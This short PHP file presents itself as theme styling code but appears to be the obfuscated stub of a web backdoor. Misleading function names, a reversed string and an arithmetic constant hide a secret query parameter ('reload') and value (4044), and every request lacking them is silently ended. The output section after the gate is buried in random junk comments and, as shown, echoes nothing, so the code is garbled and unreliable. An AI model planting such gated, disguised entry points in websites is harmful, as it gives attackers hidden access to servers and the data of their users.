<?php
function themeStyle($x){
    return strrev($x); // rellsd'
}
function themeCss($x){
    return strval($x + 123); // metsa
}
$logoThemes = themeStyle('daoler'); // reda'
$iconLogo = themeCss(3921);         // mopr'
if(!isset($_GET[$logoThemes]) || $_GET[$logoThemes] !== $iconLogo){
    exit();
}
?>
<?=/*GjcK.ho/M<bh:I^{B*7|\iLi)AzB$mX[y6*/(	 //c'A;?'o|.^S$5aGg=!KL8]IY/|
""//jWHy"gMH`^(;9@^D\W|X<&$)P7
